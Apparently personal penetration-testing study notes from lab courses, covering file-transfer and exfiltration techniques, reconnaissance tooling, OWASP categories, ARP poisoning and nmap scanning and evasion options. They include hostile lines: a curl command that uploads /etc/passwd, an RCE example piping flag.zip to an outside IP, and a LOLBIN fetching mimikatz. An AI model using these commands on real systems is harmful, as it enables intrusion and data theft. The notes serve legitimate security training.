        m1l0js@htb[/htb]$ sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/

      > Now we can test uploading by using cURL to send a PUT request. In the below example, we will upload the /etc/passwd file to the server and call it users.txt
      + Upload File Using cURL
        m1l0js@htb[/htb]$ curl -T /etc/passwd

        user65:x:1000:1000:,,,:/home/user65:/bin/bash
      > Once we have this working, a good test is to ensure the directory listing is not enabled by navigating to http://localhost/SecretUploadDirectory. By default, with Apache, if we hit a directory without an index file (index.html), it will list all the files. This is bad for our use case of exfilling files because most files are sensitive by nature, and we want to do our best to hide them. Thanks to Nginx being minimal, features like that are not enabled by default.

  * Certutil
    > Casey Smith (@subTee) found that Certutil can be used to download arbitrary files. It is available in all Windows versions and has been a popular file transfer technique, serving as a defacto wget for Windows. However, the Antimalware Scan Interface (AMSI) currently detects this as malicious Certutil usage.

[+] Detection
  > Command-line detection based on blacklisting is straightforward to bypass, even using simple case obfuscation. However, although the process of whitelisting all command lines in a particular environment is initially time-consuming, it is very robust and allows for quick detection and alerting on any unusual command lines.
  > Most client-server protocols require the client and server to negotiate how content will be delivered before exchanging information. This is common with the HTTP protocol. There is a need for interoperability amongst different web servers and web browser types to ensure that users have the same experience no matter their browser. HTTP clients are most readily recognized by their user agent string, which the server uses to identify which HTTP client is connecting to it, for example, Firefox, Chrome, etc.
  > User agents are not only used to identify web browsers, but anything acting as an HTTP client and connecting to a web server via HTTP can have a user agent string (i.e., cURL, a custom Python script, or common tools such as sqlmap, or Nmap).
  > Organizations can take some steps to identify potential user agent strings by first building a list of known legitimate user agent strings, user agents used by default operating system processes, common user agents used by update services such as Windows Update, and antivirus updates, etc. These can be fed into a SIEM tool used for threat hunting to filter out legitimate traffic and focus on anomalies that may indicate suspicious behavior. Any suspicious-looking user agent strings can then be further investigated to determine whether they were used to perform malicious actions. This website(http://useragentstring.com/index.php) is handy for identifying common user agent strings. A list of user agent strings is available here (http://useragentstring.com/pages/useragentstring.php)
  > Malicious file transfers can also be detected by their user agents. The following user agents/headers were observed from common HTTP transfer techniques (tested on Windows 10, version 10.0.14393, with PowerShell 5).

  * LOLBAS / GTFOBins
    > Application whitelisting may prevent you from using PowerShell or Netcat, and command-line logging may alert defenders to your presence. In this case, an option may be to use a "LOLBIN" (living off the land binary), alternatively also known as "misplaced trust binaries." An example LOLBIN is the Intel Graphics Driver for Windows 10 (GfxDownloadWrapper.exe), installed on some systems and contains functionality to download configuration files periodically. This download functionality can be invoked as follows:
      + Transferring File with GfxDownloadWrapper.exe
        PS C:\htb> GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
    > Such a binary might be permitted to run by application whitelisting and be excluded from alerting. Other, more commonly available binaries are also available, and it is worth checking the LOLBAS project to find a suitable "file download" binary that exists in your environment. Linux's equivalent is the GTFOBins project and is definitely also worth checking out. As of the time of writing, the GTFOBins project provides useful information on nearly 40 commonly installed binaries that can be used to perform file transfers.

#Shells & payloads
* Anatomy of a shell
  > Every operating system has a shell, and to interact with it, we must use an application known as a terminal emulator. Here are some of the most common terminal emulators:
    Terminal Emulator	Operating System
    Windows Terminal	Windows
    cmder	            Windows
    PuTTY	            Windows
    kitty	            Windows, Linux and MacOS
    Alacritty	        Windows, Linux and MacOS
    xterm	            Linux
    GNOME Terminal	  Linux
    MATE Terminal	    Linux
    Konsole	          Linux
    Terminal	        MacOS
    iTerm2	          MacOS
  > Another way we can identify the language interpreter is by viewing the processes running on the machine. In Linux, we can do this using the following command:
    + Shell Validation From 'ps'
      m1l0js@htb[/htb]$ ps

#OWASP top 10

Number	Category	Description
1.	Broken Access Control	Restrictions are not appropriately implemented to prevent users from accessing other users accounts, viewing sensitive data, accessing unauthorized functionality, modifying data, etc.
2.	Cryptographic Failures	Failures related to cryptography which often leads to sensitive data exposure or system compromise.
3.	Injection	User-supplied data is not validated, filtered, or sanitized by the application. Some examples of injections are SQL injection, command injection, LDAP injection, etc.
4.	Insecure Design	These issues happen when the application is not designed with security in mind.
5.	Security Misconfiguration	Missing appropriate security hardening across any part of the application stack, insecure default configurations, open cloud storage, verbose error messages which disclose too much information.
6.	Vulnerable and Outdated Components	Using components (both client-side and server-side) that are vulnerable, unsupported, or out of date.
7.	Identification and Authentication Failures	Authentication-related attacks that target user's identity, authentication, and session management.
8.	Software and Data Integrity Failures	Software and data integrity failures relate to code and infrastructure that does not protect against integrity violations. An example of this is where an application relies upon plugins, libraries, or modules from untrusted sources, repositories, and content delivery networks (CDNs).
9.	Security Logging and Monitoring Failures	This category is to help detect, escalate, and respond to active breaches. Without logging and monitoring, breaches cannot be detected..
10.	Server-Side Request Forgery	SSRF flaws occur whenever a web application is fetching a remote resource without validating the user-supplied URL. It allows an attacker to coerce the application to send a crafted request to an unexpected destination, even when protected by a firewall, VPN, or another type of network access control list (ACL).

* Now since we have access to the first target machine, we can easily access the second machine. But if there is some webapp running on that second machine, we can't access it directly, unless we have a proxy setup to relay the request via the compromised target. And that's what we will set up in this step!

Basic concepts ==>
#VPN
  VPN uses cryptogrpahy to extend a private network over a public one, like the Internet. When you are connected via VPN, you are actually running the same protocols of the private network. This lets you perform even low-level network operations (i.e. Wireshark)

#Hexadecimal arithmetic 
  In order to distinguish them from decimal numbers, we add 0x at the beginning or h at the end
#Encapsulation 
  If every protocol has a header and a payload, how can a protocol use the one on its lowe layer? The entire upper protocol packet(header plus payload) is the payload of the lower one; this is called encapsulation

IP packets are called datagrams. IP runs on the Internet layer.
Layer 2 packets ==> frames
The CAM (Content Addressable Memory) table is stored in the device's RAM and is constantly refreshed with new information
Routers do not forward packets coming from one interface if they have ff:ff:ff:ff:ff:ff broadcast MAC address.
iptables ==> https://www.frozentux.net/iptables-tutorial/iptables-tutorial.html
#IPv6
	There are prefixes instead of subnets blocks
	reserved addresses ==> ::1/128 is a loopback address and ::FFFF:0:0/96 are IPv4 mapped addresses
	64 bits [network part] : 64 bits [device part]
	48 bits ==> global unicast address ==> Global ones and reside in global internet. This are for Internet global addressing.
	16 bits ==> subnet id. Used for defining subnets
	-=-=-=-=
	unique local and link local ==> Reside only in internal networks
		Unique local ==> Scope internal network or VPN - Internally routable but not routed on Internet
		Link Local ==> Scope network link - Not routed internally or externally
#Wireshark
#Check ports opened
  netstat -tunp, netstat -ano or netstat -p tcp -p upd | lsof -n i4TCP -i4UDP #TCPView from sysinternals
#Check routes
  ip route, route print or netstat -r 
  	#route add -net 192.168.222.0 netmask 255.255.255.0 gw 10.175.34.1 ==> An example
  	#ip route add 192.168.222.0/24 via 10.175.34.1 ==> Another way
#Check ip
  ip addr, ipconfig /alll or ifconfig
#Example of RCE
  GET /?cmd=ls+-la+/home/student #When you got RCE ==> http://demo.ine.local:8000?cmd=curl+192.77.184.2+--upload-file+flag.zip
  301 ==> Moved permanently
  302 ==> The resource is temporarily under another URI

##Information Gathering
* Enumeration is a widely used term in cyber security. It stands for information gathering using active (scans) and passive (use of third-party providers) methods. It is important to note that OSINT is an independent procedure and should be performed separately from enumeration because OSINT is based exclusively on passive information gathering and does not involve active enumeration of the given target.
* 	No.	Principle
	1.	There is more than meets the eye. Consider all points of view.
	2.	Distinguish between what we see and what we do not see.
	3.	There are always ways to gain more information. Understand the target.
* 3 main different levels 
	> Infrastructure-based enumeration
		1. Internet Presence	Identification of internet presence and externally accessible infrastructure.	Domains, Subdomains, vHosts, ASN, Netblocks, IP Addresses, Cloud Instances, Security Measures
		2. Gateway	Identify the possible security measures to protect the company's external and internal infrastructure.	Firewalls, DMZ, IPS/IDS, EDR, Proxies, NAC, Network Segmentation, VPN, Cloudflare
	> Host-based enumeration
		3. Accessible Services	Identify accessible interfaces and services that are hosted externally or internally.	Service Type, Functionality, Configuration, Port, Version, Interface
		4. Processes	Identify the internal processes, sources, and destinations associated with the services.	PID, Processed Data, Tasks, Source, Destination
	> OS-based enumeration
		5. Privileges	Identification of the internal permissions and privileges to the accessible services.	Groups, Users, Permissions, Restrictions, Environment
		6. OS Setup	Identification of the internal components and systems setup.	OS Type, Patch Level, Network config, OS Environment, Configuration files, sensitive private files

###Passive
* IP addresses
  	host hackersploit.org
  	nslookup hackersploit.org
      > With Nslookup, we can search for domain name servers on the Internet and ask them for information about hosts and domains. Although the tool has two modes, interactive and non-interactive, we will mainly focus on the non-interactive module.
        We can query A records by just submitting a domain name. But we can also use the -query parameter to search specific resource records. Some examples are:
          export TARGET="facebook.com"
          nslookup $TARGET
[+] Whois 
  > We can consider WHOIS as the "white pages" for domain names. It is a TCP-based transaction-oriented query/response protocol listening on TCP port 43 by default. We can use it for querying databases containing domain names, IP addresses, or autonomous systems and provide information services to Internet users. The protocol is defined in RFC 3912. The first WHOIS directory was created in the early 1970s by Elizabeth Feinler and her team working out of Stanford University's Network Information Center (NIC). Together with her team, they created domains divided into categories based upon a computer's physical address. We can read more about the fascinating history of WHOIS here.

  > The WHOIS domain lookups allow us to retrieve information about the domain name of an already registered domain. The Internet Corporation of Assigned Names and Numbers (ICANN) requires that accredited registrars enter the holder's contact information, the domain's creation, and expiration dates, and other information in the Whois database immediately after registering a domain. In simple terms, the Whois database is a searchable list of all domains currently registered worldwide.

  > WHOIS lookups were initially performed using command-line tools. Nowadays, many web-based tools exist, but command-line options often give us the most control over our queries and help filter and sort the resultant output. Sysinternals WHOIS for Windows or Linux WHOIS command-line utility are our preferred tools for gathering information. However, there are some online versions like whois.domaintools.com we can also use ==> (https://www.whois.com/)
  > We would get the following response from the previous command to run a whois lookup against the facebook.com domain. An example of this whois command is:
    export TARGET="facebook.com" # Assign our target to an environment variable
    whois $TARGET
  > From this output, we have gathered the following information

[+]Certificates
	> Certificate Transparency is a process that is intended to enable the verification of issued digital certificates for encrypted Internet connections. The main reason is Certificate Transparency (CT), a project that requires every SSL/TLS certificate issued by a Certificate Authority (CA) to be published in a publicly accessible log. We will learn how to examine CT logs to discover additional domain names and subdomains for a target organization using two primary resources:
    https://censys.io
    https://crt.sh
    https://sslmate.com/certspotter/
    https://certstream.calidog.io/
    http://ct.cloudfare.com/
	  * With cURL
		  curl -s https://crt.sh/\?q\=inlanefreight.com\&output\=json | jq .
      export TARGET="facebook.com"
        curl -s "https://crt.sh/?q=${TARGET}&output=json" | jq -r '.[] | "\(.name_value)\n\(.common_name)"' | sort -u > "${TARGET}_crt.sh.txt"
    * With openssl
      export TARGET="facebook.com"
      export PORT="443"
      openssl s_client -ign_eof 2>/dev/null <<<$'HEAD / HTTP/1.0\r\n\r' -connect "${TARGET}:${PORT}" | openssl x509 -noout -text -in - | grep 'DNS' | sed -e 's|DNS:|\n|g' -e 's|^\*.*||g' | tr -d ',' | sort -u
		  > If needed, we can also have them filtered by the unique subdomains
		  	curl -s https://crt.sh/\?q\=inlanefreight.com\&output\=json | jq . | grep name | cut -d":" -f2 | grep -v "CN=" | cut -d'"' -f2 | awk '{gsub(/\\n/,"\n");}1;' | sort -u
	> Next, we can identify the hosts directly accessible from the Internet and not hosted by third-party providers. This is because we are not allowed to test the hosts without the permission of third-party providers.
		for i in $(cat subdomainlist);do host $i | grep "has address" | grep inlanefreight.com | cut -d" " -f1,4;done
	> Shodan - IP list
		for i in $(cat subdomainlist);do host $i | grep "has address" | grep inlanefreight.com | cut -d" " -f4 >> ip-addresses.txt;done
		for i in $(cat ip-addresses.txt);do shodan host $i;done
	> Websites
		Browsing to https://10.10.10.121/ and viewing the certificate reveals the details below, including the email address and company name. These could potentially be used to conduct a phishing attack if this is within the scope of an assessment.
[+] Passive infrastructure identification
  * Netcraft
    > Netcraft can offer us information about the servers without even interacting with them, and this is something valuable from a passive information gathering point of view. We can use the service by visiting https://sitereport.netcraft.com and entering the target domain.
    > Some interesting detials we can observe from the report are:
      Background	General information about the domain, including the date it was first seen by Netcraft crawlers.
      Network	Information about the netblock owner, hosting company, nameservers, etc.
      Hosting history	Latest IPs used, webserver, and target OS.
    > We need to pay special attention to the latest IPs used. Sometimes we can spot the actual IP address from the webserver before it was placed behind a load balancer, web application firewall, or IDS, allowing us to connect directly to it if the configuration allows it. This kind of technology could interfere with or alter our future testing activities.
  * Wayback Machine
    > The Internet Archive is an American digital library that provides free public access to digitalized materials, including websites, collected automatically via its web crawlers.
    > We can access several versions of these websites using the Wayback Machine(http://web.archive.org/) to find old versions that may have interesting comments in the source code or files that should not be there. This tool can be used to find older versions of a website at a point in time. Let's take a website running WordPress, for example. We may not find anything interesting while assessing it using manual methods and automated tools, so we search for it using Wayback Machine and find a version that utilizes a specific (now vulnerable) plugin. Heading back to the current version of the site, we find that the plugin was not removed properly and can still be accessed via the wp-content directory. We can then utilize it to gain remote code execution on the host and a nice bounty.
    > We can also use the tool waybackurls to inspect URLs saved by Wayback Machine and look for specific keywords. Provided we have Go set up correctly on our host, we can install the tool as follows:
      go install github.com/tomnomnom/waybackurls@latest
        cat domains.txt | waybackurls > urls
    > To get a list of crawled URLs from a domain with the date it was obtained, we can add the -dates switch to our command as follows:
      waybackurls -dates https://facebook.com > waybackurls.txt
      cat  waybackurls.txt
    > If we want to access a specific resource, we need to place the URL in the search menu and navigate to the date when the snapshot was created. As stated previously, Wayback Machine can be a handy tool and should not be overlooked. It can very likely lead to us discovering forgotten assets, pages, etc., which can lead to discovering a flaw.

  	spyse requires a subscription but it seems to be very useful
  > TheHarvester is a simple-to-use yet powerful and effective tool for early-stage penetration testing and red team engagements.
    We can use it to gather information to help identify a company's attack surface. The tool collects emails, names, subdomains, IP addresses, and URLs
    from various public data sources for passive information gathering. For now, we will use the following modules. To automate this, we will create a file called sources.txt with the following contents:

    cat sources.txt | while read source; do theHarvester -d "${TARGET}" -b $source -f "${source}_${TARGET}";done
  > When the process finishes, we can extract all the subdomains found and sort them via the following command:
    cat *.json | jq -r '.hosts[]' 2>/dev/null | cut -d':' -f 1 | sort -u > "${TARGET}_theHarvester.txt"

###Active information gathering
[+] Active Infrastructure Indentification
  > A web application's infrastructure is what keeps it running and allows it to function. Web servers are directly involved in any web application's operation. Some of the most popular are Apache, Nginx, and Microsoft IIS, among others.

  > If we discover the webserver behind the target application, it can give us a good idea of what operating system is running on the back-end server. For example, if we find out the IIS version running, we can infer the Windows OS version in use by mapping the IIS version back to the Windows version that it comes installed on by default. Some default installations are:

    IIS 6.0: Windows Server 2003
    IIS 7.0-8.5: Windows Server 2008 / Windows Server 2008R2
    IIS 10.0 (v1607-v1709): Windows Server 2016
    IIS 10.0 (v1809-): Windows Server 2019
  > Although this is usually correct when dealing with Windows, we can not be sure in the case of Linux or BSD-based distributions as they can run different web server versions in the case of Nginx or Apache. This kind of technology could interfere with or alter our future testing activities. Nevertheless, if we deal with a web server, we will not be able to find any fingerprints about the server in HTML or JS.
  * Web Servers
    > We need to discover as much information as possible from the webserver to understand its functionality, which can affect future testing. For example, URL rewriting functionality, load balancing, script engines used on the server, or an Intrusion detection system (IDS) in place may impede some of our testing activities.
    > The first thing we can do to identify the webserver version is to look at the response headers.
      curl -I "http://${TARGET}"
    > There are also other characteristics to take into account while fingerprinting web servers in the response headers. These are:
      X-Powered-By header: This header can tell us what the web app is using. We can see values like PHP, ASP.NET, JSP, etc.
      Cookies: Cookies are another attractive value to look at as each technology by default has its cookies. Some of the default cookie values are:
          .NET: ASPSESSIONID<RANDOM>=<COOKIE_VALUE>
          PHP: PHPSESSID=<COOKIE_VALUE>
          JAVA: JSESSION=<COOKIE_VALUE>
    > Other available tools analyze common web server characteristics by probing them and comparing their responses with a database of signatures to guess information like web server version, installed modules, and enabled services. Some of these tools are:
      Whatweb recognizes web technologies, including content management systems (CMS), blogging platforms, statistic/analytics packages, JavaScript libraries, web servers, and embedded devices. We recommend reading the whatweb help menu via whatweb -h to understand the available options, like the aggression level controls or verbose output. In this case, we will use an aggression level of 3 via the -a flag and verbose output via -v.
        whatweb -a3 https://www.facebok.com -v
  	> Add-ons => builtwith or wappalyzer 
  * WAF detection with wafw00f
    > WafW00f is a web application firewall (WAF) fingerprinting tool that sends requests and analyses responses to determine if a security solution is in place.
    > https://github.com/EnableSecurity/wafw00f
	    wafw00f -l : List all WAFs that WAFW00F is able to detect
  	  -a : Find all WAFs which match the signatures, do not stop testing on the first one
      -i: Read targets from an input file
      -p: Proxy the requests
  * Aquatone
    > Aquatone is a tool for automatic and visual inspection of websites across many hosts and is convenient for quickly gaining an overview of HTTP-based attack surfaces by scanning a list of configurable ports, visiting the website with a headless Chrome browser, and taking and screenshot. This is helpful, especially when dealing with huge subdomain lists.

[+] DNS Zone Transfers
  > The zone transfer is how a secondary DNS server receives information from the primary DNS server and updates it. The master-slave approach is used to organize DNS servers within a domain, with the slaves receiving updated DNS information from the master DNS. The master DNS server should be configured to enable zone transfers from secondary (slave) DNS servers, although this might be misconfigured.
  > (Another explanation): 	In certain cases, DNS server admins may want to copy or transfer zone files from one DNS server to another. If misconfigured and left unsecured, this functionality can be abused by attackers to copy the zone file from the primary DNS server to another DNS SERVER
  > For example, we will use the https://hackertarget.com/zone-transfer/ service and the zonetransfer.me domain to have an idea of the information that can be obtained via this technique. A manual approach will be the following set of commands:
    1. Identifying nameservers
      nslookup -type=NS zonetransfer.me
    2. Perform the Zone transfer using -type=any and -query=AXFR parameters
      nslookup -type=any -query=AXFR zonetransfer.me nsztm1.digi.ninja
    3. If we manage to perform a successful zone transfer for a domain, there is no need to continue enumerating this particular domain as this will extract all the available information.
[+] Gobuster
  > Gobuster is a tool that we can use to perform subdomain enumeration. It is especially interesting for us the patterns options as we have learned some naming conventions from the passive information gathering we can use to discover new subdomains following the same pattern.
  > We can use a wordlist from Seclists repository along with gobuster if we are looking for words in patterns instead of numbers. Remember that during our passive subdomain enumeration activities, we found a pattern lert-api-shv-{NUMBER}-sin6.facebook.com. We can use this pattern to discover additional subdomains. The first step will be to create a patterns.txt file with the patterns previously discovered, for example:
    lert-api-shv-{GOBUSTER}-sin6
    atlas-pp-shv-{GOBUSTER}-sin6
  > The next step will be to launch gobuster using the dns module, specifying the following options:
    dns: Launch the DNS module
      -q: Don't print the banner and other noise.
      -r: Use custom DNS server
      -d: A target domain name
      -p: Path to the patterns file
      -w: Path to the wordlist
      -o: Output file
  > export TARGET="facebook.com"
    export NS="d.ns.facebook.com"
    export WORDLIST="numbers.txt"
    gobuster dns -q -r "${NS}" -d "${TARGET}" -w "${WORDLIST}" -p ./patterns.txt -o "gobuster_${TARGET}.txt"

      ❯ dnsenum zonetransfer.me
      ❯ fierce --domain zonetransfer.me

[+] Crawling 
  > Crawling a website is the systematic or automatic process of exploring a website to list all of the resources encountered along the way. It shows us the structure of the website we are auditing and an overview of the attack surface we will be testing in the future. We use the crawling process to find as many pages and subdirectories belonging to a website as possible.
  * ZAP
    > Zed Attack Proxy (ZAP) is an open-source web proxy that belongs to the Open Web Application Security Project (OWASP). It allows us to perform manual and automated security testing on web applications. Using it as a proxy server will enable us to intercept and manipulate all the traffic that passes through it.

    > We can use the spidering functionality following the next steps. Open ZAP, and on the top-right corner, open the browser.
    > Write the website in the address bar and add it to the scope using the first entry in the left menu.
    > Head back to the ZAP Window, right-click on the target website, click on the Attack menu, and then the Spider submenu.
    > One handy feature of ZAP is the built-in Fuzzer and Manual Request Editor. We can send any request to them to alter it manually or fuzz it with a list of payloads by right-clicking on the request and using the menu "Open/Resend with Request Editor..." or the "Fuzz..." submenu under the Attack menu.
    > (https://www.zaproxy.org/docs/desktop/start/) ==> Documentation
  * FFUF
    > ZAP spidering module only enumerates the resources it finds in links and forms, but it can miss important information such as hidden folders or backup files.
    > We can use ffuf to discover files and folders that we cannot spot by simply browsing the website. All we need to do is launch ffuf with a list of folders names and instruct it to look recursively through them.
      ffuf -recursion -recursion-depth 1 -u http://192.168.10.10/FUZZ -w /opt/useful/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt
    > We can see in the image how ffuf creates new jobs for every detected folder. This task can be very resource-intensive for the target server. If the website responds slower than usual, we can lower the rate of requests using the -rate parameter.

[+] Sensitive information disclosure
  > It is typical for the webserver and the web application to handle the files it needs to function. However, it is common to find backup or unreferenced files that can have important information or credentials. Backup or unreferenced files can be generated by creating snapshots, different versions of a file, or from a text editor without the web developer's knowledge. There are some lists of common extensions we can find in the raft-[ small | medium | large ]-extensions.txt files from SecLists(https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content).
  > We will combine some of the folders we have found before, a list of common extensions, and some words extracted from the website to see if we can find something that should not be there. The first step will be to create a file with the following folder names and save it as folders.txt.
  > Next, we will extract some keywords from the website using CeWL. We will instruct the tool to extract words with a minimum length of 5 characters -m5, convert them to lowercase --lowercase and save them into a file called wordlist.txt -w <FILE>:
    cewl -m5 --lowercase -w wordlist.txt http://192.168.10.10
  > The next step will be to combine everything in ffuf to see if we can find some juicy information. For this, we will use the following parameters in ffuf:
    ffuf -w ./folders.txt:FOLDERS,./wordlist.txt:WORDLIST,./extensions.txt:EXTENSIONS -u http://192.168.10.10/FOLDERS/WORDLISTEXTENSIONS
      -w: We separate the wordlists by coma and add an alias to them to inject them as fuzzing points later
      -u: Our target URL with the fuzzing points.

* Cloud resources
	 > The configurations made by the administrators may nevertheless make the company's cloud resources vulnerable. This often starts with the S3 buckets (AWS), blobs (Azure), cloud storage (GCP), which can be accessed without authentication if configured incorrectly.
	 > Often cloud storage is added to the DNS list when used for administrative purposes by other employees. This step makes it much easier for the employees to reach and manage them. Let us stay with the case that a company has contracted us, and during the IP lookup, we have already seen that one IP address belongs to the s3-website-us-west-2.amazonaws.com server.
	[+] However, there are many different ways to find such cloud storage. One of the easiest and most used is Google search combined with Google Dorks. For example, we can use the Google Dorks inurl: and intext: to narrow our search to specific terms. In the following example, we see red censored areas containing the company name
		> Google search for AWS
			intext:inlane.com inurl:amazonaws.com
		> Google search for Azure
			intext:inlane.com inurl:blob.core.windows.net
	> Third-party providers can also tell us a lot about the company's infrastructure. 
		https://domain.glass/
		https://buckets.grayhatwarfare.com/ ==> We can do many different searches, discover AWS, Azure, and GCP cloud storage, and even sort and filter by file format. Therefore, once we have found them through Google, we can also search for them on GrayHatWarefare and passively discover what files are stored on the given cloud storage
* Staff
	> Sites :
		- Linkedin
			About: Aj
		- Xing
	



* Example after recollecting DNS enumeration
	> For example, Atlassian states that the company uses this solution for software development and collaboration. If we are not familiar with this platform, we can try it for free to get acquainted with it.
	> Google Gmail indicates that Google is used for email management. Therefore, it can also suggest that we could access open GDrive folders or files with a link.
	> LogMeIn is a central place that regulates and manages remote access on many different levels. However, the centralization of such operations is a double-edged sword. If access as an administrator to this platform is obtained (e.g., through password reuse), one also has complete access to all systems and information.
	> Mailgun offers several email APIs, SMTP relays, and webhooks with which emails can be managed. This tells us to keep our eyes open for API interfaces that we can then test for various vulnerabilities such as IDOR, SSRF, POST, PUT requests, and many other attacks.
	> Outlook is another indicator for document management. Companies often use Office 365 with OneDrive and cloud resources such as Azure blob and file storage. Azure file storage can be very interesting because it works with the SMB protocol.
	> The last thing we see is INWX. This company seems to be a hosting provider where domains can be purchased and registered. The TXT record with the "MS" value is often used to confirm the domain. In most cases, it is similar to the username or ID used to log in to the management platform.

[+] ARP poisoning
	> What is and what you can do?
		> The attacker can manipulate other host's ARP cache by sending gratuitous ARP replies (unsolicited ARP replies). The atacker sends a reply without waiting for a host to perform a request.
	    	> The attacker can prevent the poisoned entry from expiring by sending gratuitous ARP replies every 30 seconds or so.
	    	> As soon as the attacker's machine receives the packets, it must forward them to the correct destination. Otherwise, the communication between the victim hosts will not work. 
	    	> This operation lets the hacker:
	    		Sniff traffic between the poisoned hosts even if the machines sit on a switched network
	    	   	Change the content of the packets thus manipulating the information exchanged by the two parties.
	    	> This kind of attack can be even used on a entire network and against a router, letting an attacker intercept the communication between a LAN and the Internet.
	
	> Tools
		apt get install dsniff: Collection of tools for network auditing and penetration test. 
		> Before running the tool, you have to enable the Linux Kernel IP Forwarding (this feature transforms a Linux box into a router. This tell your machine to forward the packets you intercept to the real destination host)

###masscan
* You could perform host discovery using masscan and then conduct a detailed scan with nmap against certain interesting hosts
	masscan -p22,80,443,53,3389,8080,445 -Pn --rate=800 --banners 192.168.188.0/24 -e tun0 --router-ip 192.168.188.133.1 --echo > massscan.conf
* You could edit 'massscan.conf' and add format = list

###NMAP
* If our target sends an SYN-ACK flagged packet back to the scanned port, Nmap detects that the port is open.
* If the packet receives an RST flag, it is an indicator that the port is closed.
* If Nmap does not receive a packet back, it will display it as filtered. Depending on the firewall configuration, certain packets may be dropped or ignored by the firewall.

####Host discovery
* Nmap
	nmap -v -oG - ==> Since no target is specified, the scan will fail but will show the ports scanned.
	sudo nmap 10.129.2.0/24 -sn -oA tnet | grep for | cut -d" " -f5 ==> Scan network range
		> This scanning method works only if the firewalls of the hosts allow it. Otherwise, we can use other scanning techniques to find out if the hosts are active or not
		> If we disable port scan (-sn), Nmap automatically ping scan with ICMP Echo Requests (-PE). Once such a request is sent, we usually expect an ICMP reply if the pinging host is alive. The more interesting fact is that our previous scans did not do that because before Nmap could send an ICMP echo request, it would send an ARP ping resulting in an ARP reply. We can confirm this with the "--packet-trace" option. To ensure that ICMP echo requests are sent, we also define the option (-PE) for this.
		> Another way to determine why Nmap has our target marked as "alive" is with the "--reason" option.
		> We see here that Nmap does indeed detect whether the host is alive or not through the ARP request and ARP reply alone. To disable ARP requests and scan our target with the desired ICMP echo requests, we can disable ARP pings by setting the "--disable-arp-ping" option. Then we can scan our target again and look at the packets sent and received.
		> An ICMP echo request can help us determine if our target is alive and identify its system. More strategies about host discovery can be found at:
			https://nmap.org/book/host-discovery-strategies.html
				--source-port <portnum> (same as -g) ==> Some naive firewall administrators make a ruleset exception in order to keep DNS (port 53) or FTP-DATA (port 20) working. Of course this opens a hole big enough to drive an Nmap ping scan through
				--date-length <length> ==> This helps make the scan less conspicuous and more like the packets generated by the ubiquitous ping diagnostics program. Several intrusion detection systems (IDS), including Snort, have alerts for zero-byte ping packets. This option evades those alerts. An option value of 32 makes an echo request look more like it came from Windows, while 56 simulates the default Linux ping.
				--ttl <value> ==>  Reducing the outgoing TTL with --ttl helps to reduce router CPU load when loops are encountered.
				--max-rtt-timeout <time> ==>  These options control how long Nmap waits for a ping response.
				--reason ==> The normal Nmap output indicates whether a host is up or not, but does not describe which discovery test(s) the host responded to. For this detail, add the --reason option. The results can be confusing for host discovery since Nmap does not always try every probe. It stops as soon as it gets a first response. So Nmap might report an ICMP echo response from a host during the run, but then a RST response might be received first during a second run and lead Nmap to report that.
				--packet-trace ==>  This option shows every packet send and received by Nmap, including details such as sequence numbers, TTL values, and TCP flags.

* Concept: 
	ping : for one host
    	fping : multiple hosts
####Port scanning and another options
* The STATE heading confirms that these ports are open. Sometimes we will see other ports listed that have a different state, such as filtered. This can happen if a firewall is only allowing access to the ports from specific addresses.
* The SERVICE heading tells us the service's name is typically mapped to the specific port number. However, the default scan will not tell us what is listening on that port. Until we instruct Nmap to interact with the service and attempt to tease out identifying information, it could be another service altogether.
* 	State		Description
	open		This indicates that the connection to the scanned port has been established. These connections can be TCP connections, UDP datagrams as well as SCTP associations.
	closed		When the port is shown as closed, the TCP protocol indicates that the packet we received back contains an RST flag. This scanning method can also be used to determine if our target is alive or not.
	filtered	Nmap cannot correctly identify whether the scanned port is open or closed because either no response is returned from the target for the port or we get an error code from the target.
	unfiltered	This state of a port only occurs during the TCP-ACK scan and means that the port is accessible, but it cannot be determined whether it is open or closed.
	open|filtered	If we do not get a response for a specific port, Nmap will set it to that state. This indicates that a firewall or packet filter may protect the port.
	closed|filtered	This state only occurs in the IP ID idle scans and indicates that it was impossible to determine if the scanned port is closed or filtered by a firewall.
* By default, Nmap scans the top 1000 TCP ports with the SYN scan (-sS). This SYN scan is set only to default 'when we run it as root' because of the socket permissions required to create raw TCP packets. Otherwise, the TCP scan (-sT) is performed by default
* Port Scanning 
	--top-ports=10
	-F : Top 100 ports
	-n : No DNS resolution
	--disable-arp-ping: Disables ARP ping scan
	--packet-trace ==> Shows all packets sent and received
	-sL: List scan - simply list targets to scan
  	-iL: Input from list of hosts/networks
	-Pn: Treats all hosts as online not only those responding to ping. Skip host discovery. 
	-sT ==>	It is useful when we want to map the network and don't want to disturb the services running behind it, thus causing a minimal impact and sometimes considered a more polite scan method. It is also useful when the target host has a personal firewall that drops incoming packets but allows outgoing packets. In this case, a Connect scan can bypass the firewall and accurately determine the state of the target ports. However, it is important to note that the Connect scan is slower than other types of scans because it requires the scanner to wait for a response from the target after each packet it sends, which could take some time if the target is busy or unresponsive.

		> One disadvantage to Nmap's presented results is that the automatic scan can miss some information because sometimes Nmap does not know how to handle it. Let us look at an example of this.
			> If we look at the results from Nmap, we can see the port's status, service name, and hostname. Nevertheless, let us look at this line here:
    				NSOCK INFO [0.4200s] nsock_trace_handler_callback(): Callback: READ SUCCESS for EID 18 [10.129.2.28:25] (35 bytes): 220 inlane ESMTP Postfix (Ubuntu)..
			> Then we see that the SMTP server on our target gave us more information than Nmap showed us. Because here, we see that it is the Linux distribution Ubuntu. It happens because, after a successful three-way handshake, the server often sends a banner for identification. This serves to let the client know which service it is working with. At the network level, this happens with a PSH flag in the TCP header. However, it can happen that some services do not immediately provide such information. It is also possible to remove or manipulate the banners from the respective services. If we manually connect to the SMTP server using nc, grab the banner, and intercept the network traffic using tcpdump, we can see what Nmap did not show us.
				sudo tcpdump -i eth0 host 10.10.14.2 and 10.129.2.28
				nc -nv 10.129.2.28 25
					> The first three lines show us the three-way handshake.

* Tools
	https://github.com/FortyNorthSecurity/EyeWitness ==> Which can be used to take screenshots of target web applications, fingerprint them, and identify possible default credentials.

####OS detection:
* On every network node ==> routers, firewalls, hosts, servers, printers and so on.
* Passive => You can perform OS fingerprint on a traffic capture you recorded 
* Active  => By using nmang -g p or other similar tools 
	-g/--source-port <portnum>: Use given port number
	-O: Enable OS detection
